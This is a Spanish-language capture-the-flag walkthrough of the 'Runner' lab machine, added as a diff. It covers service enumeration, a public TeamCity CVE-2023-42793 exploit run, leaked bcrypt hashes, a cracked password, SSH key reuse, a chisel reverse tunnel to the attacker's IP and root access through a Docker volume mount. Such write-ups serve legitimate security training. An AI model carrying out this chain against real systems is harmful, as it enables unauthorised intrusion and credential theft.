@@ -1,0 +1,140 @@
+Runner - Medium
+
+Empezamos con nmap
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://runner.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.38 seconds
+
+encontramos runner.htb
+
+web chula sales@runner.htb
+contact lleva al mail
+
+8000 not found
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 178] [--> http://runner.htb/assets/]
+
+en el 8000
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/version              (Status: 200) [Size: 9]
+/health               (Status: 200) [Size: 3]
+
+health -> OK
+version -> 0.0.0-src
+
+wfuzz -c -z file,/usr/share/SecLists/Discovery/DNS/n0kovo_subdomains_medium.txt --hh=154 -t 200 -H "HOST: FUZZ.runner.htb" http://runner.htb
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000046856:   401        1 L      9 W        66 Ch       "teamcity - teamcity"   
+
+teamcity
+
+    START EXTENSION CONTENT jetbrains.buildServer.resetPassword.ResetPasswordPageExtension: name:resetPasswordLink: /plugins/reset-password/resetPasswordLink.jsp 
+    START EXTENSION CONTENT jetbrains.buildServer.web.forbiddenDomains.ForbiddenDomainHeaderWarning$Extension: name:jetbrains.buildServer.web.forbiddenDomains.ForbiddenDomainHeaderWarning: /forbiddenDomainWarning.jsp 
+
+Version 2023.05.3 (build 129390) TeamCity
+
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                 | java/remote/47891.txt
+JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                          | java/remote/51884.py
+TeamCity < 9.0.2 - Disabled Registration Bypass                                                                                     | multiple/remote/46514.js
+TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                             | multiple/remote/45917.rb
+TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                 | php/webapps/48201.py
+------------------------------------------------------------------------------------------------------------------------------------ ------------------------
+
+https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-42793
+
+python3 exploit.py -u http://teamcity.runner.htb
+[+] http://teamcity.runner.htb/login.html [H454NSec4563:@H454NSec]
+
+Bueno sencillo logeamos rapidito
+
+hay un usuario matthew@runner.htb y john@runner.htb que es admin
+
+con la herramienta backup descargo una backup del proyecto
+
+ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1722023578262, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+11, h454nsec4563, $2a$07$AmtOIVLXLxT5T9GIhUVYSuZyExuUEE4eK5nVkMSH.4pV6hptQSXN., , "", 1722023603635, BCRYPT
+
+hay una llave ssh
+
+./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
+
+ssh -i id_rsa john@10.129.230.247 --> y entramos
+
+por otro lado hashcat solo me dio para matthew piper123
+
+Bueno conseguimos la flag de user
+
+
+-----------------
+
+
+Instalamos linpeas
+
+john@runner:~$ netstat -tlpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                  
+
+./chisel client 10.10.16.24:1234 R:9000:127.0.0.1:9000
+
+bueno el servicio oculto es https://docs.portainer.io/start/install-ce
+
+parece que docker tiene una vulnerabilidad
+
+https://elmaalmi-billal.medium.com/vulnerability-docker-runc-process-cwd-and-leaked-fds-container-breakout-cve-2024-21626-d14ab2e1b53e
+
+la imagen teamcity:latest
+y en working dir usamos el cve
+
+/proc/self/fd/8
+
+añadimos terminal tty
+
+
+no soy capaz de explotar ese cve
+
+hago un volumen para probar ubuntu
+ vol Unused 	- 	local 	/var/lib/docker/volumes/vol/_data 	2024-07-26 23:09:50 	private 
+
+creamos la imagen y montamos el volumen en /mnt/
+
+entramos en mnt y ya podemos ver la bandera root.txt de haber montado el volumen dentro de nuestro contenedor
+
+bueno despues de trastear un poco montando el volument en /mnt ya accedemos la flag
+
+Bueno y fin, tenía cosilla pero no era dificil, solo hay que investigar
